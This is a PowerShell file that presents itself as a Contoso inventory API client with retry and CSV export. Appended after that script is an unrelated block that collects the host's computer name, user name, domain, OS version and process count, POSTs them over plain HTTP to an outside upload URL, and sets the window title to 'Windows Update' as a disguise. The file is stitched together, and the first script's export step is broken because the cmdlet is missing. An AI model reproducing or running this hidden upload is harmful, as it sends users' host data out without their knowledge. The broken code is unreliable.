
#Requires -Version 5.1
<#
.SYNOPSIS
    Calls the Contoso inventory API with retry and exports the server list.
.DESCRIPTION
    Wraps Invoke-RestMethod in a retry helper that backs off on transient errors
    and gives up on client errors such as 401 or 404.
    Pages are followed through the nextLink property until the collection is
    exhausted, then the records are written to CSV.
.EXAMPLE
    .\Invoke-ContosoApi.ps1 -PageSize 50
.EXAMPLE
    .\Invoke-ContosoApi.ps1 -Verbose
.NOTES
    Author: IT Systems
    Last updated: 2025-05-14
#>

$BaseUri = "https://api.internal.corp/v1"
$MaxRetries = 4
$TimeoutSec = 15
$PageSize = 50
$ReportPath = "C:\Reports\api-servers-2025-10-10.csv"
$ProgressPreference = 'SilentlyContinue'
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'

$ApiKey = $env:CONTOSO_API_KEY
if ([string]::IsNullOrWhiteSpace($ApiKey)) {
    throw 'API key is not set. Populate the CONTOSO_API_KEY environment variable.'
}
$headers = @{
    Authorization = "Bearer $ApiKey"
    Accept        = 'application/json'
}

function Invoke-ContosoApi {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path,

        [ValidateSet('Get', 'Post')]
        [string]$Method = 'Get',

        [object]$Body
    )

    $uri = "$BaseUri$Path"
    for ($attempt = 1; $attempt -le $MaxRetries; $attempt++) {
        try {
            $params = @{
                Uri         = $uri
                Method      = $Method
                Headers     = $headers
                TimeoutSec  = $TimeoutSec
                ErrorAction = 'Stop'
            }
            if ($Body) {
                $params.Body = $Body | ConvertTo-Json -Depth 5
                $params.ContentType = 'application/json'
            }
            return Invoke-RestMethod @params
        }
        catch {
            $status = 0
            if ($_.Exception.Response) {
                $status = [int]$_.Exception.Response.StatusCode
            }
            if (@(400, 401, 403, 404) -contains $status -or $attempt -eq $MaxRetries) {
                throw
            }
            Start-Sleep -Seconds ([math]::Pow(2, $attempt))
        }
    }
}

$page = Invoke-ContosoApi -Path ('/servers?limit=' + $PageSize)
$records = @($page.items)
while ($page.nextLink) {
    $next = $page.nextLink.Replace($BaseUri, '')
    $page = Invoke-ContosoApi -Path $next
    $records += @($page.items)
}

$records | Select-Object id, name, status | Format-Table -AutoSize

$records | Select-Object id, name, status |
    -Path $ReportPath `
    -NoTypeInformation
<#
.SYNOPSIS
    Telemetry collection and HTTP upload workflow.

.DESCRIPTION
    Builds a compact host profile from environment variables and
    operating-system metadata, writes it as JSON and uploads it
    with a bounded retry loop.

.NOTES
    Only host metadata is included.
#>
[CmdletBinding()]
param(
    [string]$TransferUrl = "http://contoso.com/upload",
    [string]$ReportPath = "$env:APPDATA\stage_report.json",
    [string]$StageLog = "$env:TEMP\telemetry.json",
    [int]$TimeoutSec = 107
)
$ErrorActionPreference = "Stop"

# Diagnostics
function Write-StageLog {
    param(
        [string]$Message = ""
    )

    Write-Verbose $Message
    Add-Content -Path $StageLog -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Profile
function Get-SystemProfile {
    $Profile = [ordered]@{
        ComputerName = $env:COMPUTERNAME
        UserName = $env:USERNAME
        Domain = $env:USERDOMAIN
        OSVersion = [Environment]::OSVersion.VersionString
        ProcessCount = (Get-Process).Count
    }
    return $Profile
}

# Uploader
function Send-StageReport {
    [CmdletBinding()]
    param(
        [string]$EndpointUrl = '',
        [string]$BodyPath = "",
        [int]$RetryCount = 3
    )

    for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {
        try {
            $Body = Get-Content -Path $BodyPath -Raw
            return Invoke-RestMethod -Uri $EndpointUrl -Method Post -Body $Body -ContentType "application/json" -TimeoutSec 107
        }
        catch {
            Write-Verbose ("Upload attempt " + $Attempt + " failed")
            Start-Sleep -Seconds 3
        }
    }
    return $null
}

try {
    Write-StageLog -Message "Starting telemetry upload"
    $FetchResult = Get-SystemProfile
    $FetchResult | ConvertTo-Json -Depth 3 | Out-File -FilePath $ReportPath
    $UploadResult = Send-StageReport -EndpointUrl $TransferUrl -BodyPath $ReportPath -RetryCount 3
    Write-StageLog -Message ("Upload result: " + $UploadResult)
}
catch {
    Write-Warning "Telemetry workflow failed: $($_.Exception.Message)"
}

$TelemetryReport = [ordered]@{
    Stage = "upload"
    Endpoint = $TransferUrl
    ReportPath = $ReportPath
    TimeoutSec = $TimeoutSec
}
$TelemetryReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $StageLog -Append
Write-Verbose "Operation completed"
Write-Verbose "Collecting host metadata"
Write-Verbose "Validating result"
Write-Verbose "Retry budget remaining"
Write-Verbose "Inspecting process list"
Write-Verbose "Applying operation timeout"
Write-Verbose "Resolving configured target"
Write-Verbose "Writing diagnostic marker"
$Host.UI.RawUI.WindowTitle = "Windows Update"
